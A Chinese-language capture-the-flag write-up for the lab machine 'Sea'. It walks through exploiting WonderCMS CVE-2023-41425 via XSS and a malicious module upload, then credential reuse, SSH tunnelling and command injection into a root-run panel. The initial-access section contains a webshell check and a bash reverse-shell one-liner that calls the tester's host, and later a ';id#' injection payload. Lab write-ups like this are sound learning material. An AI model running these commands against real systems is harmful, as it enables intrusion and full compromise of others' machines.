## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Sea
2. 難度:Easy
3. IP:10.129.4.85

### 主要發現：
1. 漏洞 ：跨站腳本XSS(CVE-2023-41425)（風險等級：Medium）
2. 漏洞 ：命令注入Command Injection（風險等級：Medium）

### 攻擊鏈摘要：
根據目錄爆破和原始碼搜索的結果，了解WonderCMS中存在CVE-2023-41425漏洞，這是一個跨站腳本（XSS）漏洞，攻擊者可以利用該漏洞上傳惡意模組，從而獲得系統存取權限。利用系統存取權限，取得未妥善保管的使用者憑證，可用於橫向移動，並發現內部開放端口8080，可被SSH穿隧。穿隧後暴露出以root權限執行的控制面板，可操縱POST請求造成命令注入。

### 潛在影響：
1. 公開漏洞CVE-2023-41425會造成外部攻擊者獲得系統存取權限，可能導致重要資料外洩。
2. 使用者憑證未被妥善保管，若外洩可能造成敏感資料外洩及權限提升。
3. 8080埠控制面板未過濾特殊符號，造成以root權限執行的命令注入漏洞，可能導致系統完全失控、資料大規模洩漏。

### 修復建議：
1. 立即更新WonderCMS版本至最新版。
2. 使用者憑證資料確實設立讀寫權限，禁止低權限身分隨意取得。
3. 8080埠控制面板需過慮敏感字符，並停止以root權限執行。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，開放埠僅有22和80，判斷系統為面向使用者的web系統，第一優先攻擊面為80。
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.4.85
sudo nmap -sT -Pn -sV -sC -O -p22,80 10.129.4.85
sudo nmap --script=vuln -p22,80 10.129.4.85
```

<img width="809" height="190" alt="螢幕擷取畫面 2026-02-13 164735" src="https://github.com/user-attachments/assets/0ac81bcb-cfd0-4648-80a0-1b914bca7c54" />
<img width="870" height="411" alt="螢幕擷取畫面 2026-02-13 165020" src="https://github.com/user-attachments/assets/be3ff43d-3ea7-4431-95e1-5d4740983c60" />
<img width="614" height="162" alt="螢幕擷取畫面 2026-02-13 171022" src="https://github.com/user-attachments/assets/3fc17f4c-0723-45d0-abdd-e8dfe54ef091" />

### 2.2 枚舉(Enumeration)

使用gobuster進行目錄爆破。
```bash
sudo gobuster dir -u http://10.129.4.85 -w /user/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
```
<img width="1236" height="605" alt="螢幕擷取畫面 2026-02-13 171724" src="https://github.com/user-attachments/assets/7f7ebc8a-db62-46ac-81c5-5d94c59e9d4b" />

探索Web頁面。

<img width="1860" height="878" alt="螢幕擷取畫面 2026-02-13 164832" src="https://github.com/user-attachments/assets/899dcd27-edbd-4d74-bb36-55391f6bd047" />
<img width="1374" height="791" alt="螢幕擷取畫面 2026-02-13 165423" src="https://github.com/user-attachments/assets/366c2809-983f-4372-871e-b5da83484d33" />

探索原始碼。

<img width="1096" height="393" alt="螢幕擷取畫面 2026-02-13 171455" src="https://github.com/user-attachments/assets/5ff18b55-d4fa-4ce8-8080-3a91f1279a2f" />
<img width="1674" height="76" alt="螢幕擷取畫面 2026-02-13 171644" src="https://github.com/user-attachments/assets/43127e6c-00d8-4092-bc1c-4764a0d9b659" />

搜尋相關訊息和是否有公開漏洞，使用Google搜尋到WonderCMS和CVE-2023-41425漏洞。


<img width="412" height="189" alt="螢幕擷取畫面 2026-02-13 171859" src="https://github.com/user-attachments/assets/ed738405-3080-4292-bc23-ea22b2f0fd5b" />
<img width="1210" height="827" alt="螢幕擷取畫面 2026-02-13 180754" src="https://github.com/user-attachments/assets/eec4fa9c-8884-43cd-ae29-d3d1197d7322" />
<img width="758" height="490" alt="螢幕擷取畫面 2026-02-13 184243" src="https://github.com/user-attachments/assets/edf62653-a31a-41c4-a085-9f196631a9f8" />
<img width="1836" height="341" alt="螢幕擷取畫面 2026-02-13 182221" src="https://github.com/user-attachments/assets/1171270f-c8b4-4338-83f8-027d674ee47a" />

根據公開漏洞消息，需要尋找到登入頁面的URL，使用Goole搜尋可以輕鬆找到。

<img width="1256" height="642" alt="螢幕擷取畫面 2026-02-13 184435" src="https://github.com/user-attachments/assets/ea7466c5-da2a-4c96-8dea-f4ffea556e94" />
<img width="1321" height="416" alt="螢幕擷取畫面 2026-02-13 184500" src="https://github.com/user-attachments/assets/f24d928e-e622-46bd-8864-d5eedfaf7ace" />


### 2.3 初始存取(Initial Access)
(本小章最後有全手動示範，截圖均為靶機結束後重開所截，故IP不同)

使用Burp Suite確認XSS的注入點，用最小PoC驗證。

<img width="1705" height="830" alt="螢幕擷取畫面 2026-02-13 185745" src="https://github.com/user-attachments/assets/b67f08c3-b441-4b6f-bcf9-ecf7f3c34c7d" />
<img width="1277" height="695" alt="螢幕擷取畫面 2026-02-13 185842" src="https://github.com/user-attachments/assets/54dc8376-b7ba-4e19-8e67-698c5495e06b" />

使用searchsploit的腳本建立Python代理和XSSPayload。
```bash
python3 52271.py --url http://sea.htb/loginURL --xip 10.10.16.86 --xport 1234
```
<img width="1434" height="278" alt="螢幕擷取畫面 2026-02-13 190659" src="https://github.com/user-attachments/assets/ef900976-a717-49e9-8ceb-8aec36d9b74e" />

將XSSPayload用和上述PoC同樣的方法注入後，Python代理會跳出回應(GET /... 200)
<img width="1417" height="356" alt="螢幕擷取畫面 2026-02-13 190712" src="https://github.com/user-attachments/assets/dae458c7-bd18-4829-81f2-cc50a00c1814" />

可使用腳本附帶驗證工具檢驗
```bash
curl "http://sea.htb/themes/malicious/malicious.php?cmd=id"
```

<img width="700" height="139" alt="螢幕擷取畫面 2026-02-13 190921" src="https://github.com/user-attachments/assets/3f35df0d-a987-4322-a3c4-b68e99e5af3b" />


若確認成功，即可使用腳本附帶工具獲得反彈Shell
```bash
nc -lvnp 4444
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.86/4444 0>&1'"
```

<img width="356" height="147" alt="螢幕擷取畫面 2026-02-13 191047" src="https://github.com/user-attachments/assets/a1adf46e-7d3b-4f2d-8bf1-39c27a5d5fd6" />
<img width="973" height="89" alt="螢幕擷取畫面 2026-02-13 191558" src="https://github.com/user-attachments/assets/65b4bb11-6424-48e0-b8a4-6982f55e51c4" />


獲得www-data反彈Shell，是為低權限web使用者帳號。

<img width="863" height="155" alt="螢幕擷取畫面 2026-02-13 191606" src="https://github.com/user-attachments/assets/8bb45caf-85f7-4c19-8186-6e6536755be2" />
<img width="699" height="261" alt="螢幕擷取畫面 2026-02-13 191648" src="https://github.com/user-attachments/assets/faf9919c-28a3-4e58-b35f-a75a8e6b3856" />

--- 
### 以下為手動示範，需理解js語法，以及理解這個漏洞的邏輯。
(XSS → 載入JS → JS上傳 ZIP → CMS自動解壓成PHP → RCE → Shell)

使用F12開發者工具獲得POST請求，將其複製為文件。

<img width="1501" height="692" alt="螢幕擷取畫面 2026-02-13 211855" src="https://github.com/user-attachments/assets/4250055c-9990-4532-9c50-2ae4cb909fa6" />
<img width="821" height="286" alt="螢幕擷取畫面 2026-02-13 212416" src="https://github.com/user-attachments/assets/2669de26-1c98-4e26-8bd8-c6d9fcd659ed" />

使用curl注入PoC，確認注入點。

<img width="1483" height="459" alt="螢幕擷取畫面 2026-02-13 212745" src="https://github.com/user-attachments/assets/bbed03cf-aa5c-4e3b-8bc1-f8accd2f12fa" />
<img width="739" height="429" alt="螢幕擷取畫面 2026-02-13 212805" src="https://github.com/user-attachments/assets/7c90e7a8-4843-4631-b04c-c8640e85aef2" />

建立sehll.php文件，並將其壓縮成malicious.zip。

<img width="566" height="249" alt="螢幕擷取畫面 2026-02-14 125622" src="https://github.com/user-attachments/assets/c6af3c85-cd37-49ea-9092-2a0cc0bf48cd" />
<img width="403" height="243" alt="螢幕擷取畫面 2026-02-14 125928" src="https://github.com/user-attachments/assets/20c1a8d7-0452-4cf4-aac7-11cc1deb71c0" />

建立malicious.js，將其與malicious.zip放在同一目錄下。

<img width="563" height="332" alt="螢幕擷取畫面 2026-02-14 130927" src="https://github.com/user-attachments/assets/b077bc37-6b92-4e4d-b86c-162789f4b678" />

建立簡易Python線上託管工具。

<img width="566" height="156" alt="螢幕擷取畫面 2026-02-14 131103" src="https://github.com/user-attachments/assets/0d45dafe-4579-4b58-8dfb-d6874a723eba" />

使用curl將XSS Payload注入，回覆會顯示是否成功。

<img width="1871" height="327" alt="螢幕擷取畫面 2026-02-14 133246" src="https://github.com/user-attachments/assets/a60513cc-56ea-473e-902a-92b9663ffa3e" />
<img width="731" height="422" alt="螢幕擷取畫面 2026-02-14 133256" src="https://github.com/user-attachments/assets/2dac3cbf-7cd9-46e6-84c2-f765213b7005" />

待Python代理跳出GET /... 200即為成功。

<img width="749" height="251" alt="螢幕擷取畫面 2026-02-14 133306" src="https://github.com/user-attachments/assets/93a0a674-3016-408f-8b3d-d4ee7da7d511" />

後續獲得反彈Shell步驟與腳本法相同。

<img width="913" height="516" alt="螢幕擷取畫面 2026-02-14 133845" src="https://github.com/user-attachments/assets/81407641-99b7-471e-b466-a65a615d3394" />

### 2.4 橫向移動(Lateral Movement)

探索/etc/passwd，可得amay、geo兩組可使用bash的帳號，同時/home下也只有這兩組帳號。

<img width="799" height="738" alt="螢幕擷取畫面 2026-02-13 191822" src="https://github.com/user-attachments/assets/e76fdee1-11d3-427b-b677-d8459314e88b" />

經過探索，在/var/www/sea/data/database.js中獲得一組密碼雜湊。

<img width="894" height="642" alt="螢幕擷取畫面 2026-02-13 192545" src="https://github.com/user-attachments/assets/410fdd77-74ca-46cb-9b8a-b1ad5d1ff40a" />

使用線上工具解碼(其中有轉位符\需去掉)。

<img width="1168" height="260" alt="螢幕擷取畫面 2026-02-13 193134" src="https://github.com/user-attachments/assets/9f0e6cf9-91da-46dd-aca7-578b9d895c39" />

因只有兩組帳號，直接手動測試，先驗證SSH服務，直接獲得使用者權限，並獲得user.txt。

<img width="734" height="753" alt="螢幕擷取畫面 2026-02-13 193410" src="https://github.com/user-attachments/assets/424abe4b-da40-4bd6-9086-3382d7d68d25" />
<img width="629" height="111" alt="螢幕擷取畫面 2026-02-13 193501" src="https://github.com/user-attachments/assets/53ccbb9e-cf8f-4458-9aaa-274511197ede" />


### 2.5 權限提升(Privilege Escalation)

經過枚舉，並未發現有明顯能權限提升的錯誤配置，在測試系統漏洞之前先測試內部開放埠，發現8080開放。
```bash
netstat -tnlp
```

<img width="1016" height="174" alt="螢幕擷取畫面 2026-02-13 194657" src="https://github.com/user-attachments/assets/3bd375aa-344f-4210-97ae-c18be23048b5" />

使用SSH穿隧將8080重定向到localhost:8888。

```bash
ssl -L 8888:localhost:8080 amay@sea.htb
```

<img width="1094" height="695" alt="螢幕擷取畫面 2026-02-13 195814" src="https://github.com/user-attachments/assets/a56f9e5a-1436-4cb9-928f-a5add6766658" />

在localhost:8888使用amay的憑證可登入。

<img width="809" height="517" alt="螢幕擷取畫面 2026-02-13 195850" src="https://github.com/user-attachments/assets/e08efad6-f12e-4103-b9e5-db43f27562ed" />
<img width="1358" height="828" alt="螢幕擷取畫面 2026-02-13 195946" src="https://github.com/user-attachments/assets/cc7b0c79-6411-424c-809a-199f5ef58752" />

內容為內部日誌

<img width="973" height="678" alt="螢幕擷取畫面 2026-02-13 200238" src="https://github.com/user-attachments/assets/001158bf-7e5b-4c21-a4fd-151260b2f321" />
<img width="992" height="464" alt="螢幕擷取畫面 2026-02-13 200332" src="https://github.com/user-attachments/assets/242a866e-7f92-4c25-b5c4-1f8ae719da90" />

使用Burp Suite修改POST請求，嘗試命令注入成功，但不允許直接讀取root.txt。

<img width="1186" height="580" alt="螢幕擷取畫面 2026-02-13 200432" src="https://github.com/user-attachments/assets/bc4b648a-16f8-4af4-bb60-beb9cf92dcd5" />
<img width="1004" height="504" alt="螢幕擷取畫面 2026-02-13 201228" src="https://github.com/user-attachments/assets/5b1e7041-59d8-445f-8da9-3b341f34b838" />
<img width="917" height="272" alt="螢幕擷取畫面 2026-02-13 201403" src="https://github.com/user-attachments/assets/883650c9-bd99-4e42-a3eb-954e69255778" />

利用各種註解符嘗試突破，最後測試;id#有效。

<img width="955" height="125" alt="螢幕擷取畫面 2026-02-13 201608" src="https://github.com/user-attachments/assets/9a0c9653-2567-462f-bad9-e627f966490a" />


### 2.6 最終成果(Impact)

獲得root.txt內容，也可在此注入反彈Shell Payload，但我並沒有這麼做。

<img width="946" height="128" alt="螢幕擷取畫面 2026-02-13 201721" src="https://github.com/user-attachments/assets/049d11ee-b3de-4558-a9e4-8f79ae3d6a1f" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
